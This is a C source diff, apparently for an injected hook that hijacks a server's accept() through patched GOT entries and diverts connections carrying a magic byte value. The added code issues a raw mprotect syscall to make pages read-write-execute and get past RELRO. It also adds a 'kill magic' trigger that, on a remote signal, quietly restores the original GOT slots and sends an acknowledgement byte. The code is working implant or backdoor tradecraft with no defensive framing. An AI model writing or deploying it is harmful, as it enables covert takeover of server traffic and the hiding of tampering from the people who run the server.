@@ -102,6 +102,36 @@ static void dbg_char(char c) {
 #endif
 
 /* ================================================================== */
+/* Raw mprotect — no libc; makes one page RWX so we can revert GOT   */
+/* entries that RELRO has marked read-only.                            */
+/* ================================================================== */
+
+#define PROT_RWX 7   /* PROT_READ|PROT_WRITE|PROT_EXEC */
+
+#if defined(__x86_64__)
+HOOK_ATTR
+static void hook_mprotect_page(uintptr_t addr)
+{
+    uintptr_t page = addr & ~(uintptr_t)0xFFF;
+    __asm__ volatile(
+        "syscall"
+        : : "a"(10L), "D"(page), "S"((long)0x1000), "d"((long)PROT_RWX)
+        : "rcx", "r11", "memory");
+}
+#elif defined(__arm__)
+HOOK_ATTR
+static void hook_mprotect_page(uintptr_t addr)
+{
+    uintptr_t page = addr & ~(uintptr_t)0xFFF;
+    register int r0 __asm__("r0") = (int)page;
+    register int r1 __asm__("r1") = 0x1000;
+    register int r2 __asm__("r2") = PROT_RWX;
+    register int r7 __asm__("r7") = 125; /* SYS_mprotect */
+    __asm__ volatile("swi #0" : "+r"(r0) : "r"(r1), "r"(r2), "r"(r7) : "memory");
+}
+#endif
+
+/* ================================================================== */
 /* C body — comes after the entry so the blob copy includes both.     */
 /* All libc calls go through cfg->fn_* — zero external references.   */
 /* ================================================================== */
@@ -159,10 +189,32 @@ static int hook_accept_body(int sockfd, struct sockaddr *addr, socklen_t *addrle
     }
     DBG('K');
 
-    /* compare bytes [4..7] against config magic */
-    uint32_t got_magic, cfg_magic;
-    __builtin_memcpy(&got_magic, peek + 4, 4);
-    __builtin_memcpy(&cfg_magic, cfg->magic, 4);
+    /* compare bytes [4..7] against forward magic and kill magic */
+    uint32_t got_magic, cfg_magic, kill_magic;
+    __builtin_memcpy(&got_magic,  peek + 4,       4);
+    __builtin_memcpy(&cfg_magic,  cfg->magic,      4);
+    __builtin_memcpy(&kill_magic, cfg->kill_magic, 4);
+
+    if (got_magic == kill_magic) {
+        DBG('X');
+        /* consume the peeked bytes so the sender gets a clean close */
+        do_recvfrom(local_fd, peek, 8, 0, 0, 0);
+        /* revert every patched GOT slot back to real_accept.
+         * mprotect each page first — RELRO may have marked it read-only. */
+        uint32_t i;
+        for (i = 0; i < cfg->n_patched && i < HOOK_MAX_PATCHED; i++) {
+            uintptr_t slot_addr = (uintptr_t)cfg->patched_addrs[i];
+            hook_mprotect_page(slot_addr);
+            *(uintptr_t *)slot_addr = (uintptr_t)cfg->real_accept;
+        }
+        /* ack byte so the sender can confirm the hook ran (not the real server) */
+        uint8_t ack = 0x55;
+        do_sendto(local_fd, &ack, 1, 0, 0, 0);
+        do_close(local_fd);
+        /* re-enter real accept so the server gets its next legitimate connection */
+        return real_accept(sockfd, addr, addrlen);
+    }
+
     if (got_magic != cfg_magic) {
         DBG('m');
         return local_fd;
